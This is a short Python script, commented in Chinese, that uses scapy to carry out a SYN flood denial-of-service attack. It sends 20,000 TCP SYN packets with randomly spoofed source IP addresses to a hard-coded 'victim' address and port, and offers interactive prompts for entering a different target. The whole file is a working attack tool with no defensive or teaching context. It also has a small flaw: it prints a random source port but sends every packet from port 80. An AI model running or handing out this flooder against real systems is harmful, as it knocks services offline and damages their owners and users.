from scapy.all import IP, TCP, send
import random

#生成隨機的IP
def randomIP():
    ip=".".join(map(str,(random.randint(0,255) for i in range(4))))
    return ip

#生成隨機端口
def randomPort():
    port=random.randint(1000,10000)
    return port

#syn-flood
def synFlood(count,dstIP,dstPort):
    total=0
    print("Packets are sending ...")
    for i in range(count):
        #IPlayer
        srcIP=randomIP()
        dstIP=dstIP
        IPlayer = IP(src=srcIP,dst=dstIP)
        #TCPlayer
        srcPort=randomPort()
        TCPlayer = TCP(sport=80, dport=dstPort, flags="S")
        #發送包
        packet = IPlayer / TCPlayer
        print("Source IP    :", srcIP)
        print("Source Port  :", srcPort)
        send(packet)
        total+=1
    print("Total packets sent: %i" % total)

#顯示的信息
def info():
    print("="*30)
    print("= Start SYN Flooding =")
    print("="*30)
    #輸入目標IP和端口
    dstIP = input("Victim IP : ")
    dstPort = int(input("Victim Port : "))
    return dstIP, dstPort

if __name__ == '__main__':
    # dstIP, dstPort=info()
    dstIP, dstPort= "192.168.0.104", 80
    # count=int(input("Please input the number of packets："))
    count = 20000
    synFlood(count,dstIP,dstPort)